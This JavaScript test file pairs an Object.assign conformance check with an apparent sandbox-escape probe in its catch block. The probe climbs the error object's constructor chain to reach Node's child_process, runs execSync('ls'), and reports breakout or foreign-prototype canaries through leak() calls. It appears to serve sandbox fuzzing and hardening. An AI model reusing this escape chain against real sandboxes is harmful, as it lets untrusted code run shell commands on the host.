try {
    var target = { a: 1 };
    var result = Object.assign(target, '1a2c3', { a: 'c' }, undefined, { b: 6 }, null, 125, { a: 5 });
    assert.sameValue(Object.getOwnPropertyNames(result).length, 7, 'The length should be 7 in the final object.');
    assert.sameValue(result.a, 5, 'The value should be {a:5}.');
    assert.sameValue(result[0], '1', 'The value should be {"0":"1"}.');
    assert.sameValue(result[1], 'a', 'The value should be {"1":"a"}.');
    assert.sameValue(result[2], '2', 'The value should be {"2":"2"}.');
    assert.sameValue(result[3], 'c', 'The value should be {"3":"c"}.');
    assert.sameValue(result[4], '3', 'The value should be {"4":"3"}.');
    assert.sameValue(result.b, 6, 'The value should be {b:6}.');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}